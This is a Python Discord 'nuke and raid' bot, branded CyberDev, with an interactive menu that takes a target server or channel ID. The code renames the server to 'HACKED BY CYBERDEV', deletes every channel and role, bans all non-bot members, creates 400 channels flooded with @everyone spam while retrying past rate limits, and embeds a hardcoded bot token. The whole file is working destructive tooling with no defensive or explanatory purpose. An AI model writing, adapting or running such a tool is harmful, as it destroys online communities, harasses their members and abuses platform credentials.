import discord
import asyncio
import os
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor

# ==================== CONFIGURACOES ====================
TOKEN = "MTU0NzQ1MDUwNzQ0OTA4MTkxNg.GrbJdC.qwoYI5AHamwXMlA8RVrgcgpbCl5fp7xVB6Vg8E"

NOME_SERVIDOR = "HACKED BY CYBERDEV"
NOME_CANAL_RAID = "HACKED-BY-CYBER-RIP"
QUANTIDADE_CANAIS = 400
MENSAGEM_RAID = "@everyone SERVER HACKEADO PELA CYBER RIP KKKKKKK"
QUANTIDADE_MSG_POR_CANAL = 50
QUANTIDADE_MSG_SPAM = 200

# Workers paralelos (mais = mais rapido mas mais chance de rate limit)
WORKERS = 50

COR_VERMELHO = "\033[91m"
COR_VERDE = "\033[92m"
COR_AMARELO = "\033[93m"
COR_CIANO = "\033[96m"
COR_RESET = "\033[0m"
# =====================================================

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

def fade_in_lines(texto, velocidade=0.05):
    linhas = texto.split('\n')
    for linha in linhas:
        print(linha)
        time.sleep(velocidade)

def log(tipo, msg):
    if tipo == "OK":
        print(f"{COR_VERDE}[+] {msg}{COR_RESET}")
    elif tipo == "ERRO":
        print(f"{COR_VERMELHO}[-] {msg}{COR_RESET}")
    elif tipo == "AVISO":
        print(f"{COR_AMARELO}[!] {msg}{COR_RESET}")

ASCII_ART = """
      ,o888888o.  `8.`8888.      ,8' 8 888888888o   8 8888888888  
   8888     `88. `8.`8888.    ,8'  8 8888    `88. 8 8888        
,8 8888       `8. `8.`8888.  ,8'   8 8888     `88 8 8888        
88 8888            `8.`8888.,8'    8 8888     ,88 8 8888        
88 8888             `8.`88888'     8 8888.   ,88' 8 888888888888
88 8888              `8. 8888      8 8888888888   8 8888        
88 8888               `8 8888      8 8888    `88. 8 8888        
`8 8888       .8'      8 8888      8 8888      88 8 8888        
   8888     ,88'       8 8888      8 8888    ,88' 8 8888        
    `8888888P'         8 8888      8 888888888P   8 888888888888
                                                                
8 888888888o.             8 888888888o.    8 8888 8 888888888o  
8 8888    `88.            8 8888    `88.   8 8888 8 8888    `88.
8 8888     `88            8 8888     `88   8 8888 8 8888     `88
8 8888     ,88            8 8888     ,88   8 8888 8 8888     ,88
8 8888.   ,88'            8 8888.   ,88'   8 8888 8 8888.   ,88'
8 888888888P'             8 888888888P'    8 8888 8 888888888P' 
8 8888`8b                 8 8888`8b        8 8888 8 8888        
8 8888 `8b.               8 8888 `8b.      8 8888 8 8888        
8 8888   `8b.             8 8888   `8b.    8 8888 8 8888        
8 8888     `88.           8 8888     `88.  8 8888 8 8888        
                                                                
b.             8 8 8888      88 8 8888     ,88' 8 8888888888    
888o.          8 8 8888      88 8 8888    ,88'  8 8888          
Y88888o.       8 8 8888      88 8 8888   ,88'   8 8888          
.`Y888888o.    8 8 8888      88 8 8888  ,88'    8 8888          
8o. `Y888888o. 8 8 8888      88 8 8888 ,88'     8 888888888888  
8`Y8o. `Y88888o8 8 8888      88 8 8888 88'      8 8888          
8   `Y8o. `Y8888 8 8888      88 8 888888<       8 8888          
8      `Y8o. `Y8 ` 8888     ,8P 8 8888 `Y8.     8 8888          
8         `Y8o.`   8888   ,d8P  8 8888   `Y8.   8 8888          
8            `Yo    `Y88888P'   8 8888     `Y8. 8 888888888888                                                                                             
"""

class Bot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        super().__init__(intents=intents)
        self.criados = 0
        self.lock = asyncio.Lock()
        
    async def on_ready(self):
        log("OK", f"Conectado: {self.user}")
        
    async def nuke(self, gid):
        g = self.get_guild(gid)
        if not g:
            log("ERRO", "Servidor nao encontrado")
            return
            
        try:
            await g.edit(name=NOME_SERVIDOR)
            log("OK", f"Nome alterado")
        except:
            pass
            
        tasks = []
        for c in g.channels:
            tasks.append(self._delete_channel(c))
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
            
        for r in g.roles:
            if r.name != "@everyone":
                try:
                    await r.delete()
                except:
                    pass
                    
        for m in g.members:
            if not m.bot:
                try:
                    await m.ban(reason="nuked")
                except:
                    pass
                    
        log("AVISO", "Nuke finalizado")
        
    async def _delete_channel(self, channel):
        try:
            await channel.delete()
        except:
            pass
            
    async def _criar_canal(self, guild, numero):
        try:
            ch = await guild.create_text_channel(f"{NOME_CANAL_RAID}-{numero}")
            
            async with self.lock:
                self.criados += 1
                if self.criados % 50 == 0:
                    log("OK", f"Criados: {self.criados}/{QUANTIDADE_CANAIS}")
            
            # Spam
            for _ in range(QUANTIDADE_MSG_POR_CANAL):
                try:
                    await ch.send(MENSAGEM_RAID)
                except:
                    break
                    
        except discord.errors.HTTPException as e:
            if e.status == 429:  # Rate limit
                await asyncio.sleep(e.retry_after)
                # Tenta novamente
                try:
                    ch = await guild.create_text_channel(f"{NOME_CANAL_RAID}-{numero}")
                    async with self.lock:
                        self.criados += 1
                except:
                    pass
        except:
            pass
            
    async def raid(self, gid):
        g = self.get_guild(gid)
        if not g:
            log("ERRO", "Servidor nao encontrado")
            return
            
        log("AVISO", f"Criando {QUANTIDADE_CANAIS} canais...")
        self.criados = 0
        
        # Cria um semaforo para limitar concorrencia
        sem = asyncio.Semaphore(WORKERS)
        
        async def criar_com_limite(n):
            async with sem:
                await self._criar_canal(g, n)
                
        # Cria todas as tarefas
        tasks = [criar_com_limite(i) for i in range(QUANTIDADE_CANAIS)]
        
        # Executa todas
        await asyncio.gather(*tasks, return_exceptions=True)
        
        log("AVISO", f"Total criados: {self.criados}")
        
    async def spam(self, cid):
        ch = self.get_channel(cid)
        if not ch:
            log("ERRO", "Canal nao encontrado")
            return
            
        for _ in range(QUANTIDADE_MSG_SPAM):
            try:
                await ch.send(MENSAGEM_RAID)
            except:
                break

async def abertura():
    cls()
    fade_in_lines(ASCII_ART, 0.03)
    print()
    print("        By: CyberDev")
    time.sleep(0.5)

async def main():
    await abertura()
    
    bot = Bot()
    
    # Inicia o bot em background
    bot_task = asyncio.create_task(bot.start(TOKEN))
    await asyncio.sleep(3)
    
    while True:
        cls()
        print(f"{COR_VERMELHO}{ASCII_ART}{COR_RESET}")
        print(f"{COR_CIANO}        By: CyberDev{COR_RESET}")
        print()
        print(f"{COR_VERDE}Status: Online{COR_RESET}")
        print(f"{COR_AMARELO}Bot: {bot.user}{COR_RESET}")
        print()
        print("[1] Nuke Server")
        print("[2] Raid Server")  
        print("[3] Spam Canal")
        print("[4] Info")
        print("[0] Sair")
        print()
        
        cmd = input("> ").strip()
        
        if cmd == "1":
            sid = input("ID do servidor: ").strip()
            if sid.isdigit():
                await bot.nuke(int(sid))
            input("ENTER...")
            
        elif cmd == "2":
            sid = input("ID do servidor: ").strip()
            if sid.isdigit():
                await bot.raid(int(sid))
            input("ENTER...")
            
        elif cmd == "3":
            cid = input("ID do canal: ").strip()
            if cid.isdigit():
                await bot.spam(int(cid))
            input("ENTER...")
            
        elif cmd == "4":
            cls()
            print(f"{COR_VERMELHO}{ASCII_ART}{COR_RESET}")
            print()
            print("Dev: CyberDev")
            print(f"Canais: {QUANTIDADE_CANAIS}")
            print(f"Workers: {WORKERS}")
            input("ENTER...")
            
        elif cmd == "0":
            await bot.close()
            break

if __name__ == "__main__":
    asyncio.run(main())